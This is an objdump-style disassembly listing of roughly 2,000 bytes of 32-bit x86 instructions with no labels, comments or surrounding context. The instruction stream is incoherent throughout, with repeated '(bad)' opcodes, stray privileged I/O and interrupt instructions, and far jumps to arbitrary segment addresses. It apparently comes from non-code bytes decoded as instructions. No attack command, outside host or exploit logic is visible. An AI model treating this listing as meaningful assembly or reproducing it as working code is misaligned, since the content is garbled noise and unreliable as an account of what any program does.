  426e34:	jnp    0x426eab
  426e36:	cmp    BYTE PTR [ebp+0x78cb5c6b],dl
  426e3c:	ret    
  426e3d:	pop    ecx
  426e3e:	neg    ecx
  426e40:	sub    dl,BYTE PTR [edi]
  426e42:	sbb    cl,cl
  426e44:	jge    0x426e2f
  426e46:	add    al,0x6d
  426e48:	repnz mov bl,0x7b
  426e4b:	nop
  426e4c:	lds    edi,FWORD PTR [edx]
  426e4e:	sbb    cl,BYTE PTR [eax]
  426e50:	imul   edx,DWORD PTR [esi],0x41547f9e
  426e56:	test   DWORD PTR [eax-0x65],eax
  426e59:	xchg   DWORD PTR [edi+ecx*1],edx
  426e5c:	sbb    DWORD PTR [edx-0x74],esi
  426e5f:	sbb    eax,0x6622edd9
  426e64:	dec    esp
  426e65:	cmp    bh,dh
  426e67:	sti    
  426e68:	jns    0x426ed3
  426e6a:	cmp    eax,0x2919e2ad
  426e6f:	cmp    DWORD PTR [eax-0x6c8630b1],ebp
  426e75:	cld    
  426e76:	(bad)  
  426e77:	mov    dh,0xa7
  426e79:	jge    0x426e10
  426e7b:	aaa    
  426e7c:	cmc    
  426e7d:	cmp    eax,0xa1b1cca6
  426e82:	dec    edi
  426e83:	add    esp,DWORD PTR [edi-0x5fb23ca0]
  426e89:	in     al,dx
  426e8a:	ja     0x426e3a
  426e8c:	call   0xa64c:0x97106ca3
  426e93:	fwait
  426e94:	test   al,0xbf
  426e96:	inc    ecx
  426e97:	push   edx
  426e98:	dec    edi
  426e99:	jbe    0x426e88
  426e9b:	ds add al,0x65
  426e9e:	test   eax,0x8a4b96a4
  426ea3:	(bad)  
  426ea4:	jns    0x426ee9
  426ea6:	dec    edi
  426ea7:	test   al,0xe8
  426ea9:	(bad)  
  426eaa:	jmp    0x3235:0x2b798f95
  426eb1:	sub    bl,BYTE PTR [esi]
  426eb3:	pop    ebp
  426eb4:	xor    DWORD PTR [eax+0x169d386f],0x9147ec57
  426ebe:	addr16 add eax,0x6b1f88d8
  426ec4:	add    DWORD PTR [eax-0x1b],edi
  426ec7:	dec    ecx
  426ec8:	dec    ebp
  426ec9:	ret    0x7e7b
  426ecc:	xchg   BYTE PTR [ebx],cl
  426ece:	push   esi
  426ecf:	pusha  
  426ed0:	fadd   st,st(3)
  426ed2:	arpl   WORD PTR [edi-0x5ae9ac09],cx
  426ed8:	sbb    BYTE PTR [esi+0x8],al
  426edb:	sti    
  426edc:	data16 das 
  426ede:	test   DWORD PTR [bx+si],0x6a60044b
  426ee5:	sahf   
  426ee6:	dec    esp
  426ee7:	add    eax,0x38cdd7bd
  426eec:	out    dx,al
  426eed:	sar    bh,cl
  426eef:	out    dx,eax
  426ef0:	jmp    0xa0117d5c
  426ef5:	xor    ch,BYTE PTR [ebp+0x48]
  426ef8:	stos   BYTE PTR es:[edi],al
  426ef9:	inc    edx
  426efa:	cdq    
  426efb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426efc:	rol    bl,0xdb
  426eff:	std    
  426f00:	lods   al,BYTE PTR ds:[esi]
  426f01:	ja     0x426ee2
  426f03:	loopne 0x426e95
  426f05:	jb     0x426eb2
  426f07:	dec    eax
  426f08:	sub    dl,BYTE PTR [ebx-0x600faaac]
  426f0e:	fisttp DWORD PTR [esi]
  426f10:	div    BYTE PTR [ebx+0x40]
  426f13:	loop   0x426f70
  426f15:	push   ds
  426f16:	dec    eax
  426f17:	jg     0x426eef
  426f19:	and    DWORD PTR [esi],0x72a6dc0c
  426f1f:	nop
  426f20:	bound  ecx,QWORD PTR [ebp+0x1d63603d]
  426f26:	dec    esi
  426f27:	mov    edi,0x2c98b828
  426f2c:	nop
  426f2d:	mov    ecx,0xeb907cf2
  426f32:	sbb    al,0xd5
  426f34:	sub    dl,BYTE PTR [esi-0x4fc897f8]
  426f3a:	retf   
  426f3b:	mov    bl,BYTE PTR [esi+0x60c37065]
  426f41:	and    eax,0x26248622
  426f46:	mov    ecx,0xe013923c
  426f4b:	sbb    al,0x64
  426f4d:	dec    ecx
  426f4e:	and    ecx,eax
  426f50:	test   BYTE PTR [ecx],bh
  426f52:	mov    cs,edx
  426f54:	pop    ebx
  426f55:	push   eax
  426f56:	mov    esp,edi
  426f58:	inc    ebp
  426f59:	out    dx,al
  426f5a:	jge    0x426f39
  426f5c:	or     DWORD PTR [ebp+0x74],edx
  426f5f:	addr16 std 
  426f61:	xchg   ecx,eax
  426f62:	jo     0x426f49
  426f64:	repnz out dx,eax
  426f66:	wbinvd 
  426f68:	push   es
  426f69:	jge    0x426fb9
  426f6b:	and    DWORD PTR [ebp-0x43ba4f2e],esp
  426f71:	mov    eax,ds:0xfc98ca22
  426f76:	mov    ah,0xa1
  426f78:	pop    edx
  426f79:	cwde   
  426f7a:	loopne 0x426f59
  426f7c:	scas   al,BYTE PTR es:[edi]
  426f7d:	pushf  
  426f7e:	aas    
  426f7f:	test   cl,bh
  426f81:	add    bl,BYTE PTR [ebp-0x69]
  426f84:	cmp    DWORD PTR [esi-0x7e],edx
  426f87:	sbb    ch,cl
  426f89:	fnop   
  426f8b:	or     al,0x38
  426f8d:	adc    DWORD PTR [ecx],eax
  426f8f:	cli    
  426f90:	or     eax,0x6ed0194f
  426f95:	jge    0x426fd3
  426f97:	add    BYTE PTR [edx+esi*8-0x2019031e],cl
  426f9e:	clc    
  426f9f:	mov    dh,0xc3
  426fa1:	and    eax,0xa5b1fa59
  426fa6:	rcr    BYTE PTR [edi],1
  426fa8:	rol    BYTE PTR [edx],0x84
  426fab:	cld    
  426fac:	jae    0x426f8c
  426fae:	xchg   DWORD PTR [edi+ecx*4],edx
  426fb1:	and    DWORD PTR [esi-0x177cc5c8],eax
  426fb7:	mov    ds:0x8e4cc342,al
  426fbc:	push   0xffffffd3
  426fbe:	adc    cl,BYTE PTR [ebx-0x2b]
  426fc1:	mov    eax,ds:0x8408af73
  426fc6:	push   ebp
  426fc7:	popa   
  426fc8:	es stos BYTE PTR es:[edi],al
  426fca:	or     ebp,DWORD PTR [ebp+eax*4+0x65]
  426fce:	xchg   BYTE PTR [ebp-0x16962885],bh
  426fd4:	mov    WORD PTR [ecx],?
  426fd6:	scas   eax,DWORD PTR es:[edi]
  426fd7:	enter  0x96e2,0x49
  426fdb:	inc    esp
  426fdc:	jmp    0x8504c6a6
  426fe1:	or     esi,0x786d32dc
  426fe7:	ins    BYTE PTR es:[edi],dx
  426fe8:	outs   dx,DWORD PTR ds:[esi]
  426fe9:	in     eax,0xce
  426feb:	mov    eax,ds
  426fed:	and    al,0xa
  426fef:	arpl   si,ax
  426ff1:	mov    ch,0x79
  426ff3:	jmp    0xbc821ae0
  426ff8:	adc    BYTE PTR [edx+0x37c11013],al
  426ffe:	int    0xf8
  427000:	hlt    
  427001:	lds    esi,FWORD PTR [esi-0x27]
  427004:	and    BYTE PTR [ecx+0x62],ah
  427007:	lea    eax,[edi]
  427009:	and    esp,DWORD PTR [esi]
  42700b:	pushf  
  42700c:	or     edi,eax
  42700e:	aaa    
  42700f:	pop    edx
  427010:	jo     0x426fee
  427012:	enter  0xf2a6,0xe6
  427016:	sti    
  427017:	imul   ebp,DWORD PTR [ebx-0x76424c2f],0xffffffd5
  42701e:	xchg   esi,eax
  42701f:	retf   0x1cc7
  427022:	stos   BYTE PTR es:[edi],al
  427023:	in     al,dx
  427024:	pop    esi
  427025:	je     0x427083
  427027:	adc    ah,BYTE PTR [edx-0x76]
  42702a:	cmp    ah,BYTE PTR [edx+0x9]
  42702d:	and    al,BYTE PTR [eax]
	...
  427037:	add    BYTE PTR [eax],al
  427039:	add    dl,bh
  42703b:	rcl    DWORD PTR ds:0xfac73d07,cl
  427041:	jmp    DWORD PTR [ecx-0x455bc2eb]
  427047:	push   ebx
  427048:	dec    ebp
  427049:	test   BYTE PTR [eax-0x1a],0x1
  42704d:	add    ah,bh
  42704f:	add    DWORD PTR [eax],eax
  427051:	add    BYTE PTR [esi],dl
  427053:	adc    ah,dl
  427055:	pop    eax
  427056:	pop    ecx
  427057:	mov    cl,0x2d
  427059:	inc    esp
  42705a:	adc    eax,0x8aa57c63
  42705f:	jmp    esp
  427061:	(bad)  
  427062:	out    0x1a,eax
  427064:	int3   
  427065:	jnp    0x427067
  427067:	ins    BYTE PTR es:[edi],dx
  427068:	ret    
  427069:	mov    ss,WORD PTR [edi]
  42706b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42706c:	repz pop eax
  42706e:	inc    edi
  42706f:	fwait
  427070:	cmp    BYTE PTR ds:0x148b2ed,cl
  427076:	mov    al,ds:0xec73ef2f
  42707b:	jb     0x4270af
  42707d:	add    al,0x55
  42707f:	or     bl,dh
  427081:	rcl    BYTE PTR [edx-0x4e],1
  427084:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427085:	out    dx,al
  427086:	and    al,bl
  427088:	stc    
  427089:	ficom  DWORD PTR [edi+0x44]
  42708c:	aam    0x38
  42708e:	mov    ebp,0x89ecd4b1
  427093:	je     0x42701a
  427095:	mov    ds:0x49098cbe,eax
  42709a:	fnstenv [esi-0x4]
  42709d:	gs pop ebx
  42709f:	add    eax,0xe0b16a10
  4270a4:	sbb    esp,DWORD PTR [ebp+0x4366d32a]
  4270aa:	ret    
  4270ab:	into   
  4270ac:	pop    esp
  4270ad:	in     al,0xb
  4270af:	call   0x61c81381
  4270b4:	and    al,0x29
  4270b6:	cmp    BYTE PTR [esp+eiz*8+0x44],ch
  4270ba:	mov    al,ds:0x7b2daf92
  4270bf:	int    0x3a
  4270c1:	sbb    ebx,edi
  4270c3:	or     BYTE PTR [edx],ch
  4270c5:	push   ds
  4270c6:	stc    
  4270c7:	ins    DWORD PTR es:[edi],dx
  4270c8:	mov    bl,0xf5
  4270ca:	push   cs
  4270cb:	call   0xb3f4bf85
  4270d0:	into   
  4270d1:	ins    BYTE PTR es:[edi],dx
  4270d2:	mov    dl,0xa3
  4270d4:	dec    esp
  4270d5:	or     cl,BYTE PTR ds:0xe9c08a3c
  4270db:	inc    esp
  4270dc:	les    esi,FWORD PTR [ecx+eiz*2+0x6f]
  4270e0:	adc    cl,BYTE PTR [eax]
  4270e2:	cli    
  4270e3:	gs mov al,0xdd
  4270e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4270e7:	in     al,dx
  4270e8:	cdq    
  4270e9:	mov    cl,0xd7
  4270eb:	lea    edi,[ebp-0x1d3dc04a]
  4270f1:	mov    es,WORD PTR [edi-0x6a45f166]
  4270f7:	push   esi
  4270f8:	sub    BYTE PTR [ecx],ch
  4270fa:	mov    eax,ds:0x3f1d8652
  4270ff:	pop    ss
  427100:	push   esp
  427101:	jmp    0x4270da
  427103:	xchg   ecx,eax
  427104:	rcl    ecx,cl
  427106:	dec    edi
  427107:	aam    0x52
  427109:	add    esp,esp
  42710b:	ret    
  42710c:	mov    WORD PTR [ebx-0x75],gs
  42710f:	jnp    0x427162
  427111:	dec    esp
  427112:	jae    0x4270d3
  427114:	aaa    
  427115:	int    0xd3
  427117:	test   al,0x2d
  427119:	cmc    
  42711a:	sbb    BYTE PTR [ebp+0x65ffa321],bh
  427120:	enter  0x560c,0xc1
  427124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427125:	retf   0xced8
  427128:	xchg   BYTE PTR [esi+0x4f232e99],al
  42712e:	add    ebp,DWORD PTR [ecx+0x73a84bee]
  427134:	jne    0x4271a6
  427136:	es repz inc esp
  427139:	dec    esp
  42713a:	mov    dh,dl
  42713c:	jnp    0x427184
  42713e:	cs push esi
  427140:	mov    esi,0x77619981
  427145:	dec    esi
  427146:	inc    ebx
  427147:	sub    BYTE PTR [eax+0x799b5eb9],dh
  42714d:	push   esi
  42714e:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  427150:	xchg   ebx,eax
  427151:	xor    eax,0x500be02e
  427156:	dec    ebp
  427157:	xchg   ecx,eax
  427158:	inc    esp
  427159:	cmp    eax,0x36d5c1eb
  42715e:	shl    DWORD PTR [ebp+0x4103b633],cl
  427164:	jo     0x4270ef
  427166:	push   es
  427167:	arpl   bx,cx
  427169:	bound  esi,QWORD PTR [edx+0x6b9447b3]
  42716f:	imul   ebx,DWORD PTR [edx+0x6e372b9d],0xffffffb6
  427176:	cmp    DWORD PTR [edi+edx*4+0x3da5fe5c],edi
  42717d:	push   es
  42717e:	inc    esp
  42717f:	sar    BYTE PTR [edi-0x3b],1
  427182:	(bad)  
  427183:	lock ds sbb bh,dh
  427187:	and    al,0xb9
  427189:	retf   0x7b07
  42718c:	test   DWORD PTR [ecx+0x3d02dd59],ecx
  427192:	jg     0x427205
  427194:	add    dh,BYTE PTR [ebp+0x79]
  427197:	push   edi
  427198:	and    DWORD PTR [esi],ebx
  42719a:	sbb    edx,DWORD PTR [edi+0x6c7c2801]
  4271a0:	loopne 0x427136
  4271a2:	jno    0x427185
  4271a4:	test   BYTE PTR [edx-0x77],ah
  4271a7:	jp     0x427207
  4271a9:	fnstsw WORD PTR [edx+0x74111313]
  4271af:	and    eax,0xaae10a01
  4271b4:	out    dx,eax
  4271b5:	push   ebp
  4271b6:	adc    BYTE PTR [ebx+0x60],bh
  4271b9:	dec    edi
  4271ba:	inc    edi
  4271bb:	mov    al,0x9e
  4271bd:	icebp  
  4271be:	sub    ecx,DWORD PTR [eax+0x31f661c]
  4271c4:	dec    ebx
  4271c5:	cli    
  4271c6:	or     DWORD PTR [ebp+0x6ce2e620],esp
  4271cc:	xchg   ecx,eax
  4271cd:	fld    DWORD PTR [eax+0x11dbf10c]
  4271d3:	xchg   esp,eax
  4271d4:	imul   ebp,DWORD PTR [edi],0x2226e0a2
  4271da:	jo     0x427228
  4271dc:	pop    ebx
  4271dd:	shl    DWORD PTR [ecx],0xde
  4271e0:	push   esi
  4271e1:	int    0x14
  4271e3:	adc    cl,BYTE PTR [edx]
  4271e5:	cmp    BYTE PTR [esi-0x21],ah
  4271e8:	cmc    
  4271e9:	or     dh,cl
  4271eb:	lea    ecx,[ebx+edx*8]
  4271ee:	fmul   st(1),st
  4271f0:	stos   DWORD PTR es:[edi],eax
  4271f1:	pop    es
  4271f2:	sbb    BYTE PTR [edx-0x6efc7b4a],cl
  4271f8:	arpl   WORD PTR [eax-0xe],di
  4271fb:	push   edx
  4271fc:	ins    BYTE PTR es:[edi],dx
  4271fd:	outs   dx,BYTE PTR ds:[esi]
  4271fe:	lods   al,BYTE PTR ds:[esi]
  4271ff:	inc    ebp
  427200:	xlat   BYTE PTR ds:[ebx]
  427201:	rcr    BYTE PTR [ebx+0x30],1
  427204:	es cmc 
  427206:	mov    ch,0x1
  427208:	and    al,0x6b
  42720a:	call   0xcd28:0x3f5a00b6
  427211:	inc    esp
  427212:	xchg   DWORD PTR [esi-0x799b420b],esp
  427218:	sbb    eax,0x787ad39c
  42721d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42721e:	nop
  42721f:	mov    eax,0x4becc854
  427224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427225:	fs fcom st(6)
  427228:	je     0x427249
  42722a:	fstp   TBYTE PTR [edx-0x3d]
  42722d:	mov    eax,ds:0x86fc496d
  427232:	pcmpgtw mm2,QWORD PTR [edx-0x7d]
  427236:	aad    0x37
  427238:	xchg   edx,eax
  427239:	mov    esi,0x3def0663
  42723e:	push   edi
  42723f:	int    0xda
  427241:	inc    edx
  427242:	push   0x53135ed0
  427247:	stos   BYTE PTR es:[edi],al
  427248:	pop    ebx
  427249:	in     al,dx
  42724a:	sbb    cl,dl
  42724c:	fsubr  DWORD PTR [ebp+0x0]
	...
  427257:	add    BYTE PTR [eax],al
  427259:	add    bh,cl
  42725b:	neg    BYTE PTR [ebp-0x308442b0]
  427261:	(bad)  
  427262:	mov    ecx,0x55b02077
  427267:	cmp    BYTE PTR [edi],0x48
  42726a:	cmp    al,0xe8
  42726c:	add    DWORD PTR [eax],eax
  42726e:	cld    
  42726f:	add    DWORD PTR [eax],eax
  427271:	add    BYTE PTR [esi],ah
  427273:	stc    
  427274:	adc    BYTE PTR [esi],ah
  427276:	aam    0xc9
  427278:	das    
  427279:	cmp    bl,dh
  42727b:	imul   edi,esi,0x16
  42727e:	xchg   edi,eax
  42727f:	add    edi,eax
  427281:	sti    
  427282:	xchg   DWORD PTR [esi-0x73],esi
  427285:	hlt    
  427286:	mov    ?,WORD PTR [ebx+esi*2+0x79988a69]
  42728d:	cli    
  42728e:	in     eax,0xc2
  427290:	add    edx,eax
  427292:	adc    bh,dl
  427294:	ret    
  427295:	jg     0x4272ad
  427297:	int    0xd7
  427299:	inc    edx
  42729a:	xor    DWORD PTR [edx],ebp
  42729c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42729d:	jmp    0xefe5:0xb33c7d28
  4272a4:	retf   
  4272a5:	pop    ecx
  4272a6:	dec    eax
  4272a7:	imul   edx,esp,0xe0216d5b
  4272ad:	mov    esp,0x97016938
  4272b2:	or     BYTE PTR [ecx-0xdf5e1b4],ah
  4272b8:	cli    
  4272b9:	popf   
  4272ba:	stos   DWORD PTR es:[edi],eax
  4272bb:	aas    
  4272bc:	xchg   BYTE PTR [esi-0x12774613],bl
  4272c2:	sub    BYTE PTR [edi-0xb155659],0xc3
  4272c9:	(bad)  [edi-0x5ecaef8a]
  4272cf:	cwde   
  4272d0:	ret    0x1850
  4272d3:	cmp    DWORD PTR [ecx-0x5c],ebx
  4272d6:	out    0xd4,eax
  4272d8:	into   
  4272d9:	dec    ebx
  4272da:	adc    edx,DWORD PTR [ecx+0x53]
  4272dd:	push   eax
  4272de:	adc    al,0xcb
  4272e0:	or     dh,ch
  4272e2:	mov    DWORD PTR ds:[di+0x371d],eax
  4272e8:	add    al,0x47
  4272ea:	stos   DWORD PTR es:[edi],eax
  4272eb:	int3   
  4272ec:	rcl    DWORD PTR [ecx+0xa],0xeb
  4272f0:	mov    ds:0x853ac234,eax
  4272f5:	scas   al,BYTE PTR es:[edi]
  4272f6:	jle    0x4272ed
  4272f8:	repz hlt 
  4272fa:	xchg   esp,eax
  4272fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4272fc:	jmp    0xd00a:0x1f705ba
  427303:	and    bl,BYTE PTR [edx]
  427305:	sar    BYTE PTR [ebx+eiz*8-0x4cf8ae59],cl
  42730c:	adc    bh,BYTE PTR [edi+0x400bd9a]
  427312:	imul   eax,edi,0xe0b52439
  427318:	xor    edi,ebx
  42731a:	popa   
  42731b:	add    DWORD PTR [edx+0x16],0xbe3fc40f
  427322:	jl     0x4272d2
  427324:	cmp    ch,BYTE PTR [edi+0x60]
  427327:	push   0x68
  427329:	push   esi
  42732a:	jmp    0xb493b5d4
  42732f:	mov    al,0xbb
  427331:	or     esp,DWORD PTR [edx]
  427333:	pop    ecx
  427334:	ins    DWORD PTR es:[edi],dx
  427335:	xor    esp,DWORD PTR [eax+0x290525fb]
  42733b:	ret    
  42733c:	mov    edx,DWORD PTR [ebp-0x2e]
  42733f:	leave  
  427340:	je     0x4272ec
  427342:	sbb    ch,BYTE PTR [esp+eax*1]
  427345:	stos   DWORD PTR es:[edi],eax
  427346:	es xor al,0xa8
  427349:	idiv   BYTE PTR [eax+0x2a931e8d]
  42734f:	test   BYTE PTR [ecx+ebx*8],al
  427352:	inc    eax
  427353:	add    ch,cl
  427355:	lea    edi,[esp+eiz*8]
  427358:	loope  0x4273d2
  42735a:	jmp    0x221a:0xc96546af
  427361:	shl    DWORD PTR [edx],cl
  427363:	adc    al,0x1a
  427365:	mov    al,0xc9
  427367:	aam    0xa
  427369:	mov    esp,0x7622f00a
  42736e:	fdivr  st,st(6)
  427370:	adc    BYTE PTR [ecx],ch
  427372:	fst    st(1)
  427374:	push   cs
  427375:	mov    WORD PTR [ebp+0x5f87b41f],ss
  42737b:	or     bl,ch
  42737d:	rcl    DWORD PTR ds:0x2b50aa8b,1
  427383:	std    
  427384:	call   0x6dfb:0xbf10f27b
  42738b:	cld    
  42738c:	mov    bl,0xba
  42738e:	shr    ch,0x5e
  427391:	mov    ebp,0xdf9c7d80
  427396:	pop    bp
  427398:	outs   dx,BYTE PTR ds:[esi]
  427399:	pop    eax
  42739a:	fs test ecx,ebp
  42739d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42739f:	daa    
  4273a0:	push   eax
  4273a1:	bound  ebp,QWORD PTR [esi+edx*8]
  4273a4:	adc    DWORD PTR [edi],ebp
  4273a6:	mov    dl,0x27
  4273a8:	leave  
  4273a9:	call   0x5d57:0x6508471a
  4273b0:	inc    eax
  4273b1:	push   esp
  4273b2:	jecxz  0x427373
  4273b4:	inc    ecx
  4273b5:	or     ebp,DWORD PTR [eax-0x2d]
  4273b8:	adc    esp,DWORD PTR [edi+edi*2-0x199daab6]
  4273bf:	inc    eax
  4273c0:	xor    al,0x6d
  4273c2:	test   al,0xef
  4273c4:	inc    edx
  4273c5:	std    
  4273c6:	test   BYTE PTR [esi-0x703ccaaa],0xb3
  4273cd:	and    BYTE PTR [esi+eax*4],0xc4
  4273d1:	cmp    ebx,esi
  4273d3:	inc    esi
  4273d4:	loop   0x427427
  4273d6:	pop    eax
  4273d7:	or     al,0x37
  4273d9:	daa    
  4273da:	(bad)  
  4273dc:	repz sbb al,0x2a
  4273df:	std    
  4273e0:	jbe    0x42740b
  4273e2:	fld    QWORD PTR [ebx+ebp*1+0x2c720b42]
  4273e9:	sub    BYTE PTR [ecx],dh
  4273eb:	xchg   ebp,eax
  4273ec:	in     eax,0xc7
  4273ee:	arpl   WORD PTR [eax],ax
  4273f0:	test   ecx,0x4760bce8
  4273f6:	inc    ebp
  4273f7:	retf   
  4273f8:	xchg   ecx,eax
  4273f9:	inc    edx
  4273fa:	scas   eax,DWORD PTR es:[di]
  4273fc:	ja     0x4273a1
  4273fe:	xchg   esi,eax
  4273ff:	das    
  427400:	fbld   TBYTE PTR cs:[ecx]
  427403:	mov    eax,0xf0430786
  427408:	test   eax,0x5dc12c7a
  42740d:	jo     0x4273cd
  42740f:	mov    dh,0xe9
  427411:	and    BYTE PTR [eax],ch
  427413:	cs push 0xc7682b73
  427419:	and    eax,0x454a0de8
  42741e:	loop   0x427450
  427420:	scas   eax,DWORD PTR es:[edi]
  427421:	xchg   esi,eax
  427422:	hlt    
  427423:	lahf   
  427424:	xchg   BYTE PTR ds:0xcbe74829,ch
  42742a:	mov    dh,0xfb
  42742c:	dec    ebp
  42742d:	jmp    0xb3b6:0xc2bb7c8f
  427434:	out    0xed,eax
  427436:	xchg   DWORD PTR [eax],ebx
  427438:	and    ecx,DWORD PTR [edx]
  42743a:	sti    
  42743b:	es jb  0x427430
  42743e:	jg     0x427407
  427440:	jecxz  0x427448
  427442:	mov    ds:0xf4bac0c8,al
  427447:	cmp    al,0xc7
  427449:	fs or  dh,bl
  42744c:	xchg   edi,eax
  42744d:	les    ebx,FWORD PTR [esi-0x4e1c8cf1]
  427453:	dec    ebp
  427454:	aad    0xf
  427456:	jmp    0x427471
  427458:	xchg   DWORD PTR [ebp+0x3a212ead],esi
  42745e:	lock jg 0x42743c
  427461:	rcr    BYTE PTR [edi+0x7235b399],cl
  427467:	mov    dl,0xa1
  427469:	pusha  
  42746a:	das    
  42746b:	icebp  
  42746c:	sub    al,0x2f
	...
  42747a:	push   0x6f1e2d23
  42747f:	push   ds
  427480:	jnp    0x4274f9
  427482:	outs   dx,DWORD PTR ds:[esi]
  427483:	jno    0x4274a3
  427485:	dec    esi
  427486:	cmc    
  427487:	push   esp
  427488:	sbb    eax,DWORD PTR [ebx+0x1ea38]
  42748e:	cld    
  42748f:	add    DWORD PTR [eax],eax
  427491:	add    BYTE PTR [esp+eiz*8+0x74923e78],ch
  427498:	iret   
  427499:	and    BYTE PTR [ebx],dh
  42749b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42749c:	xlat   BYTE PTR ds:[ebx]
  42749d:	adc    esp,ebp
  42749f:	dec    edi
  4274a0:	add    eax,0x16f8a8b0
  4274a5:	lods   al,BYTE PTR ds:[esi]
  4274a6:	pop    esp
  4274a7:	mov    esp,0x771c38af
  4274ac:	jmp    0xb80fdbd9
  4274b1:	or     BYTE PTR [edx+0x46c626ec],dh
  4274b7:	fstp   TBYTE PTR [edi+0x4f9f57ca]
  4274bd:	lahf   
  4274be:	loopne 0x4274e4
  4274c0:	lock adc eax,ecx
  4274c3:	fidiv  DWORD PTR ds:0xec278edb
  4274c9:	shl    BYTE PTR [esi+0x47],cl
  4274cc:	and    dl,BYTE PTR [edx-0x11787cea]
  4274d2:	inc    esi
  4274d3:	jae    0x4274ed
  4274d5:	inc    edx
  4274d6:	lods   eax,DWORD PTR ds:[esi]
  4274d7:	xlat   BYTE PTR ds:[ebx]
  4274d8:	mov    ebx,0xda82739
  4274dd:	cmp    bh,ch
  4274df:	cmp    eax,0x571a166f
  4274e4:	gs cdq 
  4274e6:	jg     0x427512
  4274e8:	sbb    eax,0x7c9ad05e
  4274ed:	pop    ebp
  4274ee:	inc    esi
  4274ef:	mov    esp,DWORD PTR [edx]
  4274f1:	xchg   esp,eax
  4274f2:	xor    eax,0x7d738c83
  4274f7:	pusha  
  4274f8:	test   eax,0x365a2464
  4274fd:	das    
  4274fe:	or     BYTE PTR [ebp+ebx*1+0x1d310b33],dh
  427505:	jo     0x427495
  427507:	sub    al,BYTE PTR [ecx-0x80]
  42750a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42750b:	mov    eax,0x658bd687
  427510:	ja     0x427504
  427512:	add    BYTE PTR [ebx-0x209e2e35],al
  427518:	push   edx
  427519:	in     al,dx
  42751a:	and    ah,dh
  42751c:	xchg   edi,ebx
  42751e:	pop    eax
  42751f:	mov    ch,0xa2
  427521:	shl    BYTE PTR [ebx-0x14f0df25],cl
  427527:	rcr    BYTE PTR [edx+0x76],cl
  42752a:	addr16 mov ds:0xea69,al
  42752e:	mov    eax,DWORD PTR [ebp-0x68]
  427531:	mov    ecx,0x344f78a1
  427536:	mov    ds:0xc1eeceb2,eax
  42753b:	outs   dx,BYTE PTR ds:[esi]
  42753c:	cld    
  42753d:	retf   0x72bc
  427540:	jb     0x4274ed
  427542:	jecxz  0x42753a
  427544:	sub    ch,BYTE PTR [ebp+0x72]
  427547:	sbb    DWORD PTR [edx-0x3e],esi
  42754a:	adc    al,BYTE PTR [ecx]
  42754c:	mov    ds:0xfe122b36,eax
  427551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427552:	push   0xffffff97
  427554:	mov    al,fs:0x812f1824
  42755a:	in     al,dx
  42755b:	add    DWORD PTR [edx+ecx*8+0x392b8fab],ebp
  427562:	cli    
  427563:	lods   al,BYTE PTR ds:[esi]
  427564:	mov    dh,0x64
  427566:	dec    ecx
  427567:	lea    ebx,[esi+esi*2]
  42756a:	xchg   esi,eax
  42756b:	je     0x4274f7
  42756d:	(bad)  
  42756f:	in     al,0x6d
  427571:	shr    ch,cl
  427573:	push   0xffffffcc
  427575:	inc    ebx
  427576:	cmp    DWORD PTR [ecx-0x3e],0x47
  42757a:	ins    BYTE PTR es:[edi],dx
  42757b:	test   eax,0xbb29abdf
  427580:	or     dl,BYTE PTR ds:0xf034966e
  427586:	dec    esi
  427587:	in     al,0x7b
  427589:	loopne 0x427562
  42758b:	mov    BYTE PTR [esp+ecx*4+0x516a2dc9],cl
  427592:	pop    edx
  427593:	(bad)  
  427594:	cmp    BYTE PTR [eax+0x5534c120],al
  42759a:	inc    esi
  42759b:	aam    0x9c
  42759d:	js     0x4275a0
  42759f:	pop    eax
  4275a0:	out    dx,al
  4275a1:	bnd jle 0x42753d
  4275a4:	fld    DWORD PTR [ebp+ebx*4-0x3a0b8c88]
  4275ab:	sti    
  4275ac:	pop    ecx
  4275ad:	and    eax,edx
  4275af:	xchg   ebp,eax
  4275b0:	call   0xd91:0x75d8bd4e
  4275b7:	inc    edx
  4275b8:	icebp  
  4275b9:	xchg   ebp,eax
  4275ba:	ja     0x42757e
  4275bc:	sar    DWORD PTR [edx],1
  4275be:	jmp    0xe075:0x7afdd299
  4275c5:	xchg   ah,bh
  4275c7:	aad    0xc9
  4275c9:	and    ch,BYTE PTR [eax+edx*1+0x32]
  4275cd:	sub    bh,BYTE PTR [eax-0x1b]
  4275d0:	inc    ecx
  4275d1:	and    al,0xe5
  4275d3:	jno    0x427574
  4275d5:	fmul   st(1),st
  4275d7:	mov    bh,0x3c
  4275d9:	and    DWORD PTR [esi+0xe],edx
  4275dc:	mov    ecx,0x82222ec4
  4275e1:	sub    BYTE PTR [esi+0x6721f1c6],cl
  4275e7:	push   eax
  4275e8:	pop    edi
  4275e9:	idiv   DWORD PTR [esi]
  4275eb:	sbb    eax,0xfadfb673
  4275f0:	jo     0x4275ad
  4275f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275f3:	inc    eax
  4275f4:	xor    eax,0x9b485262
  4275f9:	jo     0x42761b
  4275fb:	adc    bh,dh
  4275fd:	shl    DWORD PTR [ebx],0x1
  427600:	nop
  427601:	repz jecxz 0x4275fc
  427604:	nop
  427605:	sbb    bh,al
  427607:	sub    dh,BYTE PTR [ebp+0xc]
  42760a:	adc    bl,BYTE PTR [eax+0x3a]
  42760d:	(bad)  
  42760f:	mov    eax,0xd96bfc34
  427614:	jge    0x42766c
  427616:	int    0x4d
  427618:	cs dec edx
  42761a:	gs dec esi
  42761c:	adc    ecx,ecx
  42761e:	daa    
  42761f:	popf   
  427620:	sbb    eax,0x19b8fe18
  427625:	mov    ah,0xa2
  427627:	jle    0x427630
  427629:	xor    al,0x92
  42762b:	xchg   BYTE PTR [esi],ch
  42762d:	retf   
  42762e:	mov    ebp,0xe936a98d
